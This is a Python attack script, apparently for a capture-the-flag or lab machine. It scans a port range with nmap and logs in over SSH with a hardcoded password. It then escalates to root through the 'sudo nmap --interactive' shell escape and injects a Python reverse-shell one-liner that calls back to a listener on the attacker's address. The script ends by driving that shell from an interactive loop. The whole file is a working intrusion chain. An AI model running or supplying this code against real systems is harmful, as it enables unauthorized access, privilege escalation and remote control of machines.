import paramiko
import time
import socket
import subprocess
import re

ip = "TARGET_IP"
username = "user"
password = "goodcat9"
key_file = "id_rsa"
local_ip = "10.0.0.1"
local_port = 4242

nmap_output = subprocess.check_output(["nmap", "-p", "31000-31500", ip]).decode()
open_port = int(re.search(r"(\d+)/tcp open", nmap_output).group(1))
print(f"Port: {open_port}")

ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
ssh.connect(ip, open_port, username, password, key_filename=key_file)
print(f"connect to port {open_port}")

stdin, stdout, stderr = ssh.exec_command("sudo nmap --interactive")

stdin.write("!sh\n")
stdin.flush()

listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
listener.bind((local_ip, local_port))
listener.listen(1)
print(f"Listening on {local_ip}:{local_port}")

reverse_shell_command = f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{local_ip}\",{local_port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'\n"
stdin.write(reverse_shell_command)
stdin.flush()

client_socket, addr = listener.accept()
print(f"Connessione accettata da {addr}")

while True:
    command = input("$ ")
    if command.lower() == "exit":
        break
    client_socket.sendall(command.encode() + b'\n')
    response = client_socket.recv(4096).decode()
    print(response, end="")

client_socket.close()
listener.close()
ssh.close()
